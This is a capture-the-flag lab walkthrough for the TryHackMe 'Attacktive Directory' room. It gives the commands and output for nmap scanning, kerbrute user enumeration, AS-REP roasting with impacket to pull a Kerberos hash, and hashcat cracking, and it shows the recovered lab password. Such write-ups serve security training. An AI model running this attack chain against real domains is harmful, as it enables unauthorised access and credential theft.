# Attacktive Directory

## Enumeration

```
sudo nmap -sC -sV -oN active_directory -Pn 10.10.13.70
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 23:45 EDT
Nmap scan report for 10.10.13.70
Host is up (0.34s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 03:45:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-07-16T03:43:04
|_Not valid after:  2024-01-15T03:43:04
|_ssl-date: 2023-07-17T03:45:54+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-17T03:45:44+00:00
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-17T03:45:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.97 seconds
```

```
./kerbrute userenum -d spookysec.local --dc 10.10.13.70 userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/17/23 - Ronnie Flathers @ropnop

2023/07/17 00:14:38 >  Using KDC(s):
2023/07/17 00:14:38 >   10.10.13.70:88

2023/07/17 00:14:39 >  [+] VALID USERNAME:       james@spookysec.local
2023/07/17 00:14:45 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2023/07/17 00:14:52 >  [+] VALID USERNAME:       James@spookysec.local
2023/07/17 00:14:54 >  [+] VALID USERNAME:       robin@spookysec.local
2023/07/17 00:15:23 >  [+] VALID USERNAME:       darkstar@spookysec.local
2023/07/17 00:15:40 >  [+] VALID USERNAME:       administrator@spookysec.local
2023/07/17 00:16:15 >  [+] VALID USERNAME:       backup@spookysec.local
2023/07/17 00:16:32 >  [+] VALID USERNAME:       paradox@spookysec.local
```

## Asrep roasting

{% code overflow="wrap" %}
```
impacket-GetNPUsers spookysec.local/ -usersfile valid.txt -request -format hashcat -outputfile asreproast.txt -dc-ip 10.10.13.70 -debug

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Trying to connect to KDC at 10.10.13.70
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[+] Trying to connect to KDC at 10.10.13.70
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.13.70
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/active_directory]
└─$ ls
active_directory  asreproast.txt  kerbrute  userlist.txt  valid.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/active_directory]
└─$ cat asreproast.txt
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5c120fdb9e783e91f778334564343fde$d1b61409fa37c587f5e8a7be13b5a2cdd7510ddbe1916fb8278d75db8e3bb127e2b28c3388b6d478d5df8c896af55dd42e3a05c0581a00b4893d0b3a86283484add4c6a0b38ed646fc0eb297e8d015a3d4bc1540523a9ed48635a6e4a5ab1cc3ef6849e9613ba0032a9a5019bec0c9bc3c23f2214b7f32dcb6c9049dda5db63d18bd88d41d86ad81ab51926b3acbc695793f518e8ff0f0bca0f07d159eb019f7302b3414d818ab00da699dab0471accc4b571a6ce0ebe0131ebd6ab1a57aa8cb23e5960d26d588dd453e77a7321596668782f273c79deab46912918f1f5d9c5075e0e7f3052d37f8e83862ef7b27a8bd6727
```
{% endcode %}

{% code overflow="wrap" %}
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5c120fdb9e783e91f778334564343fde$d1b61409fa37c587f5e8a7be13b5a2cdd7510ddbe1916fb8278d75db8e3bb127e2b28c3388b6d478d5df8c896af55dd42e3a05c0581a00b4893d0b3a86283484add4c6a0b38ed646fc0eb297e8d015a3d4bc1540523a9ed48635a6e4a5ab1cc3ef6849e9613ba0032a9a5019bec0c9bc3c23f2214b7f32dcb6c9049dda5db63d18bd88d41d86ad81ab51926b3acbc695793f518e8ff0f0bca0f07d159eb019f7302b3414d818ab00da699dab0471accc4b571a6ce0ebe0131ebd6ab1a57aa8cb23e5960d26d588dd453e77a7321596668782f273c79deab46912918f1f5d9c5075e0e7f3052d37f8e83862ef7b27a8bd6727
```
{% endcode %}

### Cracking the hash

```
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption><p>management2005</p></figcaption></figure>

